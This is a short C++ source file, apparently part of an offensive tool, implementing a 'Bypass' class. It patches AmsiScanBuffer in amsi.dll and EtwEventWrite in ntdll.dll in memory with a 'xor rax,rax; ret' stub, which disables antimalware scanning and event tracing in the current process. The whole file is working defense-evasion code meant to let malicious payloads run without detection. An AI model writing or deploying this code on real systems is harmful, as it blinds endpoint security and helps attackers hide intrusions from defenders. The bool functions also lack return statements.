#include "Bypass.h"


void Bypass::WriteMem(FARPROC addr, Patch patch) {
	HANDLE currentProcessHandle = GetCurrentProcess();
	SIZE_T rBytes;

	WriteProcessMemory(currentProcessHandle, (LPVOID)addr, patch.patchBytes.data(), patch.size, &rBytes);
}

bool Bypass::PatchAMSI() {
	FARPROC addr = GetAddr("amsi.dll", "AmsiScanBuffer");
	Patch amsi;

	amsi.size = 4;// x64
	amsi.patchBytes = { 0x48, 0x31, 0xC0, 0xC3 };
		
	WriteMem(addr, amsi);
}

bool Bypass::PatchETW() {// test this.
	FARPROC addr = GetAddr("ntdll.dll", "EtwEventWrite");
	Patch ETW;

	ETW.size = 4;// x64
	ETW.patchBytes = { 0x48, 0x31, 0xC0, 0xC3 };

	WriteMem(addr, ETW);
}

FARPROC Bypass::GetAddr(std::string dllName, std::string fName){

	// Get address for AmsiScanBuffer
	HMODULE DLLHandle = LoadLibraryA(dllName.c_str());
	FARPROC functionAddress = GetProcAddress(DLLHandle, fName.c_str());

	return functionAddress;
}